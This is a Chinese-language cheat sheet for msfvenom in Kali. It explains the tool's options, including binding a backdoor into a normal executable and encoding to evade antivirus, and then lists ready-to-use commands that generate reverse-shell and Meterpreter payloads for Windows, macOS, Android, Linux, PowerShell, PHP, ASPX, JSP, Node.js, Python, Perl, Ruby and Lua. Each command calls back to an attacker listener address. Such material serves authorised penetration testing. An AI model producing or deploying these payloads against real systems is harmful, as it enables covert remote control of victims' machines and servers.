Kali 中的 msfvenom 取代了 msfpayload 和 msfencode，常用于生成后门木马

msfpayload 是 MSF 攻击荷载生成器，用于生成 shellcode 和可执行代码。  
msfencode 是 MSF 编码器。

## 一 、msfvenom 常用参数

-l  
列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all

-p  
指定需要使用的 payload(攻击荷载)。

-f  
指定输出格式

Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；

Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；

-e  
指定需要使用的 encoder（编码器）编码免杀。

-a  
指定 payload 的目标架构

选择架构平台:x86 | x64 | x86_64  
Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe

-o  
保存 payload 文件输出。

-b  
设定规避字符集，比如: '\x00\xff' 避免使用的字符

-n  
为 payload 预先指定一个 NOP 滑动长度

-s  
设定有效攻击荷载的最大长度生成 payload 的最大长度，就是文件大小。

-i  
指定 payload 的编码次数

-c  
指定一个附加的 win32 shellcode 文件

-x  
指定一个自定义的可执行文件作为模板  
例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

-k  
保护模板程序的动作，注入的 payload 作为一个新的进程运行  
例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

-v  
指定一个自定义的变量，以确定输出格式

---

## 二、各平台生成 Payload 命令

```shell
Windows  
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp  
LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10 -f exe -o payload.exe

Mac  
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho

Android  
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -o payload.apk

Powershell  
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1

Linux  
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf

php  
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f raw > shell.php

aspx  
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx

JSP  
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.jsp

war  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war

nodejs  
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.js

python  
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.py

perl  
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.pl

ruby  
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb

lua  
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua

windows shellcode  
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c

linux shellcode  
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c

mac shellcode  
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c

```
